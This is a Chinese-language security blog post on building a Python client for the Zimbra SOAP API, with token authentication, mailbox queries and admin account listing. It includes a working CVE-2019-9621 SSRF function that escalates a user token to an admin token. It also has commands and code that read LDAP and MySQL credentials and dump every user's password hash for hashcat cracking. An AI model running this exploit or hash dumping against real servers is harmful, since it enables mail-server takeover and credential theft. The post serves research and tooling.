I"v<h2 id="0x00-前言">0x00 前言</h2>
<hr />

<p>通过Zimbra SOAP API能够对Zimbra邮件服务器的资源进行访问和修改，Zimbra官方开源了Python实现的<a href="https://github.com/Zimbra-Community/python-zimbra">Python-Zimbra</a>库作为参考</p>

<p>为了更加了解Zimbra SOAP API的开发细节，我决定不依赖<a href="https://github.com/Zimbra-Community/python-zimbra">Python-Zimbra</a>库，参照<a href="https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/index.html">API文档</a>的数据格式尝试手动拼接数据包，实现对Zimbra SOAP API的调用</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr />

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Zimbra SOAP API简介</li>
  <li>Python-Zimbra简单测试</li>
  <li>Zimbra SOAP API框架的开发思路</li>
  <li>开源代码</li>
</ul>

<h2 id="0x02-zimbra-soap-api简介">0x02 Zimbra SOAP API简介</h2>
<hr />

<p>Zimbra SOAP API包括以下命名空间：</p>

<ul>
  <li>zimbraAccount</li>
  <li>zimbraAdmin</li>
  <li>zimbraAdminExt</li>
  <li>zimbraMail</li>
  <li>zimbraRepl</li>
  <li>zimbraSync</li>
  <li>zimbraVoice</li>
</ul>

<p>每个命名空间下对应不同的操作命令，其中常用的命名空间有以下三个：</p>

<ol>
  <li>zimbraAdmin，Zimbra邮件服务器的管理接口，需要管理员权限</li>
  <li>zimbraAccount，同Zimbra用户相关的操作</li>
  <li>zimbraMail，同zimbra邮件的操作</li>
</ol>

<p>Zimbra邮件服务器默认的开放端口有以下三种：</p>

<p>1.访问邮件</p>

<p>默认端口为80或443</p>

<p>对应的地址为：<code class="language-plaintext highlighter-rouge">uri+"/service/soap"</code></p>

<p>2.管理面板</p>

<p>默认端口为7071</p>

<p>对应的地址为：<code class="language-plaintext highlighter-rouge">uri+":7071/service/admin/soap"</code></p>

<p>3.管理面板-&gt;访问邮件</p>

<p>从管理面板能够读取所有用户的邮件</p>

<p>默认端口为8443</p>

<p>对应的地址为：<code class="language-plaintext highlighter-rouge">uri+":8443/mail?adminPreAuth=1"</code></p>

<h2 id="0x03-python-zimbra简单测试">0x03 Python-Zimbra简单测试</h2>
<hr />

<p>参考地址：</p>

<p>https://github.com/Zimbra-Community/python-zimbra</p>

<p>http://zimbra-community.github.io/python-zimbra/docs/</p>

<p>对于自己的测试环境，需要忽略SSL证书验证，使用如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import ssl
ssl._create_default_https_context = ssl._create_unverified_context
</code></pre></div></div>

<p>使用用户名和口令登录的示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token = auth.authenticate(
    url,
    'test@mydomain.com',
    'password123456',
    use_password=True
)
</code></pre></div></div>

<p>使用preauth-key登录的示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token = auth.authenticate(
    url,
    'test@mydomain.com',
    'secret-preauth-key'
)
</code></pre></div></div>

<h3 id="1普通用户登录">1.普通用户登录</h3>

<p>对应的地址为：<code class="language-plaintext highlighter-rouge">uri+"/service/soap"</code></p>

<p>获得发件箱邮件数量的示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pythonzimbra.communication
from pythonzimbra.communication import Communication
import pythonzimbra.tools
from pythonzimbra.tools import auth
import warnings
warnings.filterwarnings("ignore")
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

url  = 'https://192.168.112.1/service/soap'
comm = Communication(url)
token = auth.authenticate(
    url,
    'test',
    'password123456',
    use_password=True,
)
info_request = comm.gen_request(token=token)
info_request.add_request(
    "GetFolderRequest",
    {
        "folder": {
            "path": "/sent"
        }
    },
    "urn:zimbraMail"
)
info_response = comm.send_request(info_request)
print(info_response.get_response())
if not info_response.is_fault():
    print("size:%s"%info_response.get_response()['GetFolderResponse']['folder']['n'])
</code></pre></div></div>

<p>运行结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/2-1.png" alt="Alt text" /></p>

<h3 id="2管理员登录">2.管理员登录</h3>

<p>对应的地址为：<code class="language-plaintext highlighter-rouge">uri+":7071/service/admin/soap"</code></p>

<p>获得所有邮件用户信息的示例代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pythonzimbra.communication
from pythonzimbra.communication import Communication
import pythonzimbra.tools
from pythonzimbra.tools import auth
import warnings
warnings.filterwarnings("ignore")
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

url  = 'https://192.168.112.1:7071/service/admin/soap'
comm = Communication(url)
token = auth.authenticate(
    url,
    'admin',
    'password123456',
    use_password=True,
    admin_auth=True, 
)
info_request = comm.gen_request(token=token)
info_request.add_request(
    "GetAllAccountsRequest",
    {
        
    },
    "urn:zimbraAdmin"
)
info_response = comm.send_request(info_request)
if not info_response.is_fault():
    print(info_response.get_response()['GetAllAccountsResponse'])
</code></pre></div></div>

<p>运行结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/2-2.png" alt="Alt text" /></p>

<h2 id="0x04-zimbra-soap-api框架的实现">0x04 Zimbra SOAP API框架的实现</h2>
<hr />

<p>Zimbra SOAP API的参考文档：</p>

<p>https://wiki.zimbra.com/wiki/SOAP_API_Reference_Material_Beginning_with_ZCS_8</p>

<p>https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/index.html</p>

<p>实现的总体思路如下：</p>

<ol>
  <li>模拟用户登录，获得token</li>
  <li>使用token作为凭据，进行下一步操作</li>
</ol>

<h3 id="1token的获取">1.token的获取</h3>

<h4 id="1普通用户token">(1)普通用户token</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAccount/Auth.html</p>

<p>对应命名空间为zimbraAccount</p>

<p>请求的地址为：<code class="language-plaintext highlighter-rouge">uri+"/service/soap"</code></p>

<p>根据说明文档中的SOAP格式，可通过以下Python代码实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def auth_request_low(uri,username,password):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;              
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;AuthRequest xmlns="urn:zimbraAccount"&gt;
            &lt;account by="adminName"&gt;{username}&lt;/account&gt;
            &lt;password&gt;{password}&lt;/password&gt;
         &lt;/AuthRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    print("[*] Try to auth for low token")
    try:
      r=requests.post(uri+"/service/soap",data=request_body.format(username=username,password=password),verify=False,timeout=15)
      if 'authentication failed' in r.text:
        print("[-] Authentication failed for %s"%(username))
        return False
      elif 'authToken' in r.text:
        pattern_auth_token=re.compile(r"&lt;authToken&gt;(.*?)&lt;/authToken&gt;")
        token = pattern_auth_token.findall(r.text)[0]
        print("[+] Authentication success for %s"%(username))
        print("[*] authToken_low:%s"%(token))
        return token
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<h4 id="2管理员token">(2)管理员token</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAdmin/Auth.html</p>

<p>对应命名空间为zimbraAdmin</p>

<p>请求的地址为：<code class="language-plaintext highlighter-rouge">uri+":7071/service/admin/soap"</code></p>

<p>根据说明文档中的SOAP格式，可通过以下Python代码实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def auth_request_admin(uri,username,password):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;            
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;AuthRequest xmlns="urn:zimbraAdmin"&gt;
            &lt;account by="adminName"&gt;{username}&lt;/account&gt;
            &lt;password&gt;{password}&lt;/password&gt;
         &lt;/AuthRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    print("[*] Try to auth for admin token")
    try:
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(username=username,password=password),verify=False,timeout=15)
      if 'authentication failed' in r.text:
        print("[-] Authentication failed for %s"%(username))
        return False
      elif 'authToken' in r.text:
        pattern_auth_token=re.compile(r"&lt;authToken&gt;(.*?)&lt;/authToken&gt;")
        token = pattern_auth_token.findall(r.text)[0]
        print("[+] Authentication success for %s"%(username))
        print("[*] authToken_admin:%s"%(token))
        return token
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<h4 id="补充-3普通用户token-管理员token">补充： (3)普通用户token-&gt;管理员token</h4>

<p>漏洞编号：CVE-2019-9621</p>

<p>利用<code class="language-plaintext highlighter-rouge">ProxyServlet.doProxy()</code>函数白名单检查的缺陷，能够将<code class="language-plaintext highlighter-rouge">uri+"/service/soap"</code>的请求代理到<code class="language-plaintext highlighter-rouge">uri+":7071/service/admin/soap"</code>，进而获得管理员token</p>

<p>Python实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def lowtoken_to_admintoken_by_SSRF(uri,username,password):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;AuthRequest xmlns="{xmlns}"&gt;
            &lt;account by="adminName"&gt;{username}&lt;/account&gt;
            &lt;password&gt;{password}&lt;/password&gt;
         &lt;/AuthRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    print("[*] Try to auth for low token")
    try:
      r=requests.post(uri+"/service/soap",data=request_body.format(xmlns="urn:zimbraAccount",username=username,password=password),verify=False)
      if 'authentication failed' in r.text:
        print("[-] Authentication failed for %s"%(username))
        return False
      elif 'authToken' in r.text:
        pattern_auth_token=re.compile(r"&lt;authToken&gt;(.*?)&lt;/authToken&gt;")
        low_token = pattern_auth_token.findall(r.text)[0]
        print("[+] Authentication success for %s"%(username))
        print("[*] authToken_low:%s"%(low_token))
        headers = {
        "Content-Type":"application/xml"
        }
        headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+low_token+";"
        headers["Host"]="foo:7071"
        print("[*] Try to get admin token by SSRF(CVE-2019-9621)")    
        s = requests.session()
        r = s.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(xmlns="urn:zimbraAdmin",username=username,password=password),headers=headers,verify=False)
        if 'authToken' in r.text:
          admin_token =pattern_auth_token.findall(r.text)[0]
          print("[+] Success for SSRF")
          print("[+] ADMIN_TOKEN: "+admin_token)
          return admin_token
        else:
          print("[!]")
          print(r.text)
      else:
        print("[!]")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<h3 id="2命令实现">2.命令实现</h3>

<p>如果需要管理员token，在说明文档中每个命令的Admin Authorization token required项会被标记，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/3-1.png" alt="Alt text" /></p>

<p>这里挑选几个具有代表性的命令进行介绍</p>

<h4 id="1getfolder">(1)GetFolder</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraMail/GetFolder.html</p>

<p>用来获得文件夹的属性</p>

<p>需要普通用户token</p>

<p>枚举所有文件夹下邮件数量的Python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def getfolder_request(uri,token):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
               &lt;authToken&gt;{token}&lt;/authToken&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;GetFolderRequest xmlns="urn:zimbraMail"&gt; 
         &lt;/GetFolderRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    
    try:
      print("[*] Try to get folder")
      r=requests.post(uri+"/service/soap",data=request_body.format(token=token),verify=False,timeout=15)
      pattern_name = re.compile(r"name=\"(.*?)\"")
      name = pattern_name.findall(r.text)
      pattern_size = re.compile(r" n=\"(.*?)\"")
      size = pattern_size.findall(r.text)      
      for i in range(len(name)):
        print("[+] Name:%s,Size:%s"%(name[i],size[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-1.png" alt="Alt text" /></p>

<h4 id="2getmsg">(2)GetMsg</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraMail/GetMsg.html</p>

<p>用来读取邮件信息</p>

<p>需要普通用户token</p>

<p>查看指定邮件的Python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def getmsg_request(uri,token,id):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
               &lt;authToken&gt;{token}&lt;/authToken&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;GetMsgRequest xmlns="urn:zimbraMail"&gt; 
            &lt;m&gt;
                &lt;id&gt;{id}&lt;/id&gt;
            &lt;/m&gt;
         &lt;/GetMsgRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    
    try:
      print("[*] Try to get msg")
      r=requests.post(uri+"/service/soap",data=request_body.format(token=token,id=id),verify=False,timeout=15)
      print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<p>这些需要指定要查看邮件的Message ID，测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-2.png" alt="Alt text" /></p>

<h4 id="3getcontacts">(3)GetContacts</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraMail/GetContacts.html</p>

<p>用来读取联系人列表</p>

<p>需要普通用户token</p>

<p>Python实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def getcontacts_request(uri,token,email):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
               &lt;authToken&gt;{token}&lt;/authToken&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;GetContactsRequest xmlns="urn:zimbraMail"&gt;
            &lt;a n="email"&gt;{email}&lt;/a&gt;
         &lt;/GetContactsRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    
    try:
      print("[*] Try to get contacts")
      r=requests.post(uri+"/service/soap",data=request_body.format(token=token,email=email),verify=False,timeout=15)
      pattern_data = re.compile(r"&lt;soap:Body&gt;(.*?)&lt;/soap:Body&gt;")
      data = pattern_data.findall(r.text)
      print(data[0])
      
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-3.png" alt="Alt text" /></p>

<h4 id="4getallaccounts">(4)GetAllAccounts</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAdmin/GetAllAccounts.html</p>

<p>用来获得所有用户的信息</p>

<p>需要管理员token</p>

<p>获得所有用户列表，输出用户名和对应Id的Python实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def getallaccounts_request(uri,token):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
               &lt;authToken&gt;{token}&lt;/authToken&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;GetAllAccountsRequest xmlns="urn:zimbraAdmin"&gt;
         &lt;/GetAllAccountsRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    
    try:
      print("[*] Try to get all accounts")
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
      pattern_name = re.compile(r"name=\"(.*?)\"")
      name = pattern_name.findall(r.text)
      pattern_accountId = re.compile(r"id=\"(.*?)\"")
      accountId = pattern_accountId.findall(r.text)
      
      for i in range(len(name)):
        print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/4-4.png" alt="Alt text" /></p>

<h4 id="5getldapentries">(5)GetLDAPEntries</h4>

<p>说明文档：https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/zimbraAdmin/GetLDAPEntries.html</p>

<p>用来获取ldap搜索的结果</p>

<p>需要管理员token</p>

<p>实现LDAP查询的Python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def getldapentries_request(uri,token,query,ldapSearchBase):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
               &lt;authToken&gt;{token}&lt;/authToken&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;GetLDAPEntriesRequest xmlns="urn:zimbraAdmin"&gt;
            &lt;query&gt;{query}&lt;/query&gt;
            &lt;ldapSearchBase&gt;{ldapSearchBase}&lt;/ldapSearchBase&gt;
         &lt;/GetLDAPEntriesRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    
    try:
      print("[*] Try to get LDAP Entries of %s"%(query))
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
      print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<p>这里我们需要先了解zimbra openLDAP的用法，才能明白参数<code class="language-plaintext highlighter-rouge">query</code>和<code class="language-plaintext highlighter-rouge">ldapSearchBase</code>的格式</p>

<p>在Zimbra服务器上测试以下命令：</p>

<p>1.获得连接LDAP服务器的用户名和口令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su zimbra
/opt/zimbra/bin/zmlocalconfig -s |grep zimbra_ldap
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-0.png" alt="Alt text" /></p>

<p>2.使用获得的用户名和口令连接LDAP服务器，输出所有结果：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-2.png" alt="Alt text" /></p>

<p>3.加入筛选条件，只显示用户列表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 "(&amp;(objectClass=zimbraAccount))"
</code></pre></div></div>

<p>或者</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b "ou=people,dc=zimbra,dc=com"
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-3.png" alt="Alt text" /></p>

<p>可以注意到userPassword项为用户口令的hash</p>

<p>4.再次加入筛选条件，只显示用户名称和对应hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 "(&amp;(objectClass=zimbraAccount))" mail userPassword
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-4.png" alt="Alt text" /></p>

<p>其中导出的hash前12字节为固定字符<code class="language-plaintext highlighter-rouge">e1NTSEE1MTJ9</code>，经过base64解密后的内容为<code class="language-plaintext highlighter-rouge">{SSHA512}</code>，后面部分为SHA-512加密的字符，对应hashcat的Hash-Mode为1700</p>

<h4 id="补充1其他ldap命令">补充1：其他ldap命令</h4>

<p>查询zimbra配置信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b "cn=config,cn=zimbra"

/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b "cn=cos,cn=zimbra"
</code></pre></div></div>

<p>查询zimbra server配置信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/ldapsearch -x -H ldap://mail.zimbra.com:389 -D "uid=zimbra,cn=admins,cn=zimbra" -w kwDhJ6L1V9 -b `"cn=servers,cn=zimbra"`
</code></pre></div></div>

<p>其中包括如下内容：</p>

<ul>
  <li>zimbraSshPublicKey</li>
  <li>zimbraMemcachedClientServerList</li>
  <li>zimbraSSLCertificate</li>
  <li>zimbraSSLPrivateKey</li>
</ul>

<h4 id="补充2连接mysql数据库的操作">补充2：连接MySQL数据库的操作</h4>

<p>1.获得连接MySQL数据库的用户名和口令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su zimbra
/opt/zimbra/bin/zmlocalconfig -s | grep mysql
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-5.png" alt="Alt text" /></p>

<p>2.连接MySQL数据库：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/mysql -h 127.0.0.1 -u root -P 7306 -p
</code></pre></div></div>

<p>3.查看所有数据库：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show databases;
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/5-6.png" alt="Alt text" /></p>

<p>综上，如果要查询所有用户的信息，<code class="language-plaintext highlighter-rouge">query</code>的值可以设置为<code class="language-plaintext highlighter-rouge">"cn=*"</code>，<code class="language-plaintext highlighter-rouge">ldapSearchBase</code>的值可以设置为<code class="language-plaintext highlighter-rouge">"ou=people,dc=zimbra,dc=com"</code></p>

<p><strong>注：</strong></p>

<p>不同环境的<code class="language-plaintext highlighter-rouge">ldapSearchBase</code>值不同，通常和域名保持一致</p>

<p>通过LDAP查询获得用户名称和对应hash的Python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def getalluserhash(uri,token,query,ldapSearchBase):
    request_body="""&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;
       &lt;soap:Header&gt;
           &lt;context xmlns="urn:zimbra"&gt;
               &lt;authToken&gt;{token}&lt;/authToken&gt;
           &lt;/context&gt;
       &lt;/soap:Header&gt;
       &lt;soap:Body&gt;
         &lt;GetLDAPEntriesRequest xmlns="urn:zimbraAdmin"&gt;
            &lt;query&gt;{query}&lt;/query&gt;
            &lt;ldapSearchBase&gt;{ldapSearchBase}&lt;/ldapSearchBase&gt;
         &lt;/GetLDAPEntriesRequest&gt;
       &lt;/soap:Body&gt;
    &lt;/soap:Envelope&gt;
    """
    
    try:
      print("[*] Try to get all users' hash")
      r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
      if 'userPassword' in r.text:
        pattern_data = re.compile(r"userPass(.*?)objectClass")
        data = pattern_data.findall(r.text)   
        for i in range(len(data)):
          pattern_user = re.compile(r"mail\"&gt;(.*?)&lt;")
          user = pattern_user.findall(data[i])
          pattern_password = re.compile(r"word\"&gt;(.*?)&lt;")  
          password = pattern_password.findall(data[i])  
          print("[+] User:%s"%(user[0]))  
          print("    Hash:%s"%(password[0]))

      else:
        print("[!]")
        print(r.text)      

    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/6-1.png" alt="Alt text" /></p>

<p>其中导出的hash对应hashcat的Hash-Mode为1711</p>

<p><strong>注：</strong></p>

<p>新版本的zimbra无法读取hash，显示<code class="language-plaintext highlighter-rouge">VALUE-BLOCKED</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/6-2.png" alt="Alt text" /></p>

<h2 id="0x05-开源代码">0x05 开源代码</h2>
<hr />

<p>代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py</p>

<p>代码支持三种连接方式：</p>

<ul>
  <li>普通用户token</li>
  <li>管理员token</li>
  <li>SSRF(CVE-2019-9621)</li>
</ul>

<p>连接成功后会显示支持的命令</p>

<p>普通用户token支持的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetAllAddressLists
GetContacts
GetFolder
GetItem ,Eg:GetItem /Inbox
GetMsg ,Eg:GetMsg 259
</code></pre></div></div>

<p>部分测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/7-1.png" alt="Alt text" /></p>

<p>管理员token支持的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetAllDomains
GetAllMailboxes
GetAllAccounts
GetAllAdminAccounts
GetMemcachedClientConfig
GetLDAPEntries ,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com
getalluserhash ,Eg:getalluserhash dc=zimbra,dc=com
</code></pre></div></div>

<p>部分测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-1/7-2.png" alt="Alt text" /></p>

<h2 id="0x06-日志检测">0x06 日志检测</h2>
<hr />

<p>登录日志的位置为<code class="language-plaintext highlighter-rouge">/opt/zimbra/log/mailbox.log</code></p>

<p>其他种类的邮件日志可参考https://wiki.zimbra.com/wiki/Log_Files</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr />

<p>本文简单测试了<a href="https://github.com/Zimbra-Community/python-zimbra">Python-Zimbra</a>库，参照<a href="https://files.zimbra.com/docs/soap_api/8.8.15/api-reference/index.html">API文档</a>的数据格式手动拼接数据包，实现对Zimbra SOAP API的调用，开源代码<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py">Zimbra_SOAP_API_Manage</a>，分享脚本开发的细节，便于后续的二次开发</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET